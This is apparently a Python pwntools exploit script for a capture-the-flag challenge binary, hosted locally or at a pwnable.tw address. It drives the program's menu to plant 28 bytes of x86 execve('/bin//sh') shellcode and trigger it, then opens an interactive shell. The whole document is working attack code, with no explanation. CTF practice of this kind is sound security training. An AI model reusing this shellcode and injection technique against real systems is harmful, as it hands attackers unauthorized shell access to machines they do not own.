#-*- coding:utf-8 -*-
from pwn import *
Debug = True
if Debug:
	io = process("./bin11")
else:
	io = remote("chall.pwnable.tw","10001")
#gdb.attach(io,"b *0x08048AC1")
#
#jmp_esp = 0x080de7d3
sc =     "\x31\xc0\x50\x68\x2f\x2f\x73"
sc +=    "\x68\x68\x2f\x62\x69\x6e\x89"
sc +=    "\xe3\x89\xc1\x89\xc2\xb0\x0b"
sc +=    "\xcd\x80\x31\xc0\x40\xcd\x80"
print len(sc)
io.sendlineafter("=======================\n","1")
io.sendlineafter("input index:\n","0")
#0x8fc40e1
io.sendlineafter("input your shellcode:\n","\x00"+sc)
io.sendlineafter("=======================\n","3")
io.sendlineafter("input index:\n","0")
io.interactive()

